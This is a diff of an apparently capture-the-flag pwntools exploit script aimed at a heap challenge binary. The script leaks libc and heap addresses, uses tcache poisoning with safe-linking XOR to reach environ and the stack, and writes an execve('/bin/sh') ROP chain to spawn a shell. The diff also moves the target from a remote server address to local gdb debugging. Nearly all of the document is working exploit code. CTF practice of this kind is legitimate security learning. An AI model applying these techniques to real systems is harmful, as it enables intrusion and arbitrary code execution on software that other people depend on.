@@ -10,7 +10,7 @@ from pwnlib.gdb import Gdb
 binary = './chal'
 context.binary = elf = ELF(binary)
 context.terminal = ['tmux', 'splitw', '-h']
-context.log_level = 'debug'
+# context.log_level = 'debug'
 
 def flatten(items: Iterable) -> List[Any]:
     return list(chain.from_iterable(items))
@@ -39,12 +39,11 @@ continue
 
 # GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.
 
-# with gdb.debug(binary, aslr=True, api=True, gdbscript=gdbscript) as p:
-#     p: process
-#     p.gdb: Gdb
+with gdb.debug(binary, aslr=True, api=True, gdbscript=gdbscript) as p:
+    p: process
+    p.gdb: Gdb
 
-# with process(binary, aslr=False) as p:
-with remote('128.238.62.254',12349) as p:
+# with remote('128.238.62.254',12349) as p:
 
 
     is_remote = isinstance(p, remote)
@@ -76,7 +75,7 @@ with remote('128.238.62.254',12349) as p:
         send_cmd(idx)
         p.recvuntil(b'Content:\n').decode()
         data = p.recvuntil(b'===').rstrip(b'===')
-        # log.info("Heap at idx %d: %s", idx, data)
+        log.info("Heap at idx %d: %s", idx, data)
         return data
 
     def exit():
@@ -101,44 +100,34 @@ with remote('128.238.62.254',12349) as p:
     '''
     Leak LIBC
     '''
-    add(UNSORTED_BIN_SIZE) # 0
-    add(0x50) # 1
-    delete(0) # 0
+    add(UNSORTED_BIN_SIZE) # idx 0
+    add(0x50) # idx 1
+    delete(0)
 
     main_arena = u64(show(0)[:8])
     libc_base: int = main_arena - 0x219ce0 # From main arena to libc.so.6 vmmap first entry
+    environ: int = main_arena + 0x505f0 # From main arena to p &environ
+
     libc.address = libc_base
     elf.libc.address = libc_base
-
-    rop = ROP([
-        # elf,
-        libc
-    ])
-
-    bin_sh = next(libc.search(b'/bin/sh\x00'))
-    rop.execve(bin_sh, 0, 0)
-    log.info(rop.dump())
-
-    environ: int = main_arena + 0x505f0 # From main arena to p &environ
 
     log.info(f'Main Arena: {hex(main_arena)}')
     log.info(f'LIBC base: {hex(libc_base)}')
     log.info(f'environ: {hex(environ)}')
 
-
     '''
     Get Heap leak
     '''
-    add(SIZE) # 2
+    add(SIZE) # idx 2
 
     heap_base = u64(show(0)[16:24]) - 0x290 
     log.info(f'Heap: {hex(heap_base)}')
 
-    chal_base = heap_base - 0x46000
-    log.info(f'Heap: {hex(heap_base)}')
-
-    add(SIZE) # 3
-    add(SIZE) # 4
+    '''
+    Get &environ
+    '''
+    add(SIZE) # idx 3
+    add(SIZE) # idx 4
     delete(4)
     delete(3)
     delete(2)
@@ -146,19 +135,26 @@ with remote('128.238.62.254',12349) as p:
     curr = heap_base + 0x2d0
     fw = (curr >> 12) ^ environ
 
-    log.info(f'curr environ: {hex(curr)}')
-    log.info(f'fw environ: {hex(fw)}')
+    log.info(f'array address (idx 3) for &environ: {hex(curr)}')
+    log.info(f'fw &environ: {hex(fw)}')
 
-
-
+    # Point to &environ
+    # Array idx 6 -> 3
     edit(3, p64(fw))
 
-    add(SIZE) # 2
-    add(SIZE) # 3
-    add(SIZE) # 4
+    '''
+    Get environ stack
+    '''
+    add(SIZE) # idx 5 -> 2
+    add(SIZE) # idx 6 -> 3
+    add(SIZE) # idx 7: Point to environ_stack
 
     environ_stack = u64(show(7)[:8])
-    log.info(f'environ stack: {hex(environ_stack)}')
+    log.info(f'environ_stack: {hex(environ_stack)}')
+
+    '''
+    Setup ROP chain
+    '''
 
     BIGGER_SIZE = SIZE * 4
     add(BIGGER_SIZE) # 8
@@ -175,9 +171,7 @@ with remote('128.238.62.254',12349) as p:
     # 0x564e864260a8 <array+72>:      0x0000564e883293c0
     # pwndbg> p/x 0x0000564e883293c0 - 0x564e88329000 # Array address - Heap Base
     # $1 = 0x3c0
-    array_idx_offset = 0x3c0
-    curr = heap_base + array_idx_offset
-
+    curr = heap_base + 0x3c0
 
     # WHEN IN MAIN:
     # pwndbg> p environ
@@ -190,15 +184,22 @@ with remote('128.238.62.254',12349) as p:
 
 
     fw = (curr >> 12) ^ (environ_stack - offset_to_rbp_address)
-    log.info(f'curr environ stack: {hex(curr)}')
+    log.info(f'array mem offset (idx 9) for environ {hex(curr)}')
     log.info(f'fw environ stack: {hex(fw)}')
 
     edit(9, p64(fw))
-    add(BIGGER_SIZE) # 8
+    add(BIGGER_SIZE) # idx 11 -> 8
+    add(BIGGER_SIZE) # idx 12 -> 9
+    add(BIGGER_SIZE) # idx 13 -> 10
 
-    add(BIGGER_SIZE) # 9
-    add(BIGGER_SIZE) # 10
-    # pause()
+    rop = ROP([
+        libc
+    ])
+
+    bin_sh = next(libc.search(b'/bin/sh\x00'))
+    rop.execve(bin_sh, 0, 0)
+    log.info(rop.dump())
+
     edit(13, p64(0xdeadbeef) + rop.chain())
     exit()
     p.interactive()
